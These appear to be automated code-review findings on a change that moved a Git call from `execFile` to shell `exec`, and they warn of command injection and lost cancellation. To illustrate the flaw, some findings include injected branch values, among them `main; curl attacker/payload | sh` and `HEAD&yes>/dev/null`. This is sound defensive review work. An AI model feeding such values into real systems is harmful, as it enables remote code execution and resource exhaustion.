findings.title: [P1] Pass the branch as an argv element
findings.body: When `branch` contains shell syntax, such as `main; arbitrary-command`, `exec` runs the additional command with the application's privileges. It also mishandles valid ref names containing shell metacharacters. The previous `execFile("git", ["show", branch])` passed the value directly to Git without shell interpretation.

findings.title: [P2] Preserve cancellation of the Git process
findings.body: If a caller kills the returned process while Git is still running, `exec` may terminate only the intermediate shell and leave its Git child running with inherited pipes, particularly on Windows. Returning the process created by `execFile` previously avoided this extra process boundary.

findings.title: [P2] Preserve cancellation of the actual Git process
findings.body:
`exec()` returns a handle to an intermediate shell rather than directly to Git. If callers invoke `.kill()` while `git show` is processing a large object/history, only the shell may terminate; its Git child can continue running and keep inherited pipes open. This regresses the cancellation semantics of the previous `execFile()` implementation, especially on Windows and POSIX shells that retain a child process.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argv element instead of shell text
findings.body:
`branch` is interpolated directly into a shell command. Inputs such as `main; arbitrary-command` execute additional commands with the application’s privileges; shell metacharacters also corrupt otherwise valid refs. The previous `execFile("git", ["show", branch])` avoided shell interpretation.

_Recommend validating this comment independently._

findings.title: [P1] Preserve argument-based execution to prevent shell injection
findings.body:
`exec()` invokes a shell and interpolates `branch` verbatim. Any untrusted branch value containing shell syntax—e.g. `main; curl attacker/payload | sh`—executes arbitrary commands with the application’s privileges. The previous `execFile("git", ["show", branch])` did not interpret shell metacharacters.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch arguments out of the shell to prevent unbounded subprocess workloads
findings.body:
On Unix, a valid repository-derived branch string such as `HEAD&yes>/dev/null` is interpreted as shell syntax. It launches `yes` indefinitely, consumes a CPU core, and prevents the child from completing; previously `execFile` passed the string safely to Git. Any attacker-controlled branch value can trigger equivalent resource exhaustion.

_Recommend validating this comment independently._
